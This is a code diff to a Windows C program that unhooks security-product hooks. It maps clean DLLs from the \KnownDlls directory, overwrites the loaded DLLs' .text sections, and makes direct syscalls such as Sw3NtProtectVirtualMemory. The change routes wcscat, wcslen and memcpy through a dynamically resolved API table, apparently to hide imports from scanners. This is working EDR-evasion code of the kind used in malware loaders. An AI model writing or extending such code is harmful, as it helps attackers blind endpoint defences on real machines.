@@ -14,10 +14,10 @@ LPVOID MapDllFromKnownDllDir(IN PWSTR szDllName)
     NTSTATUS               STATUS                  = 0x00;
     WCHAR                  wFullDllPath [MAX_PATH] = { L'\\', L'K', L'n', L'o', L'w', L'n', L'D', L'l', L'l', L's', L'\\' };
 
-    wcscat(wFullDllPath, szDllName);
+    apis.msvcrt.wcscat(wFullDllPath, szDllName);
 
     UniString.Buffer = (PWSTR)wFullDllPath;
-    UniString.Length = UniString.MaximumLength = wcslen(wFullDllPath) * sizeof(WCHAR);
+    UniString.Length = UniString.MaximumLength = apis.msvcrt.wcslen(wFullDllPath) * sizeof(WCHAR);
 
     InitializeObjectAttributes(&ObjectiveAttr, &UniString, OBJ_CASE_INSENSITIVE, NULL, NULL);
 
@@ -85,7 +85,7 @@ VOID UnhookAllLoadedDlls()
                 goto _CLEANUP;
             }
 
-            memcpy(pLocalTxtSectionAddress, pKnownDllTxtSectionAddress, sTextSectionSize);
+            apis.msvcrt.memcpy(pLocalTxtSectionAddress, pKnownDllTxtSectionAddress, sTextSectionSize);
 
             if ((STATUS = Sw3NtProtectVirtualMemory(NtCurrentProcess(), &pLocalTxtSectionAddress, &sTextSectionSize, dwOldProtection, &dwOldProtection)) == 0)
             {
@@ -115,7 +115,7 @@ LONG WINAPI VectoredExceptionHandler(PEXCEPTION_POINTERS pExceptionInfo)
         {
             goto _FAILURE;
         }
-        memcpy(g_pLocalTxtSectionAddress, g_pKnownDllTxtSectionAddress, g_sTextSectionSize);
+        apis.msvcrt.memcpy(g_pLocalTxtSectionAddress, g_pKnownDllTxtSectionAddress, g_sTextSectionSize);
         return EXCEPTION_CONTINUE_EXECUTION;
     }
 
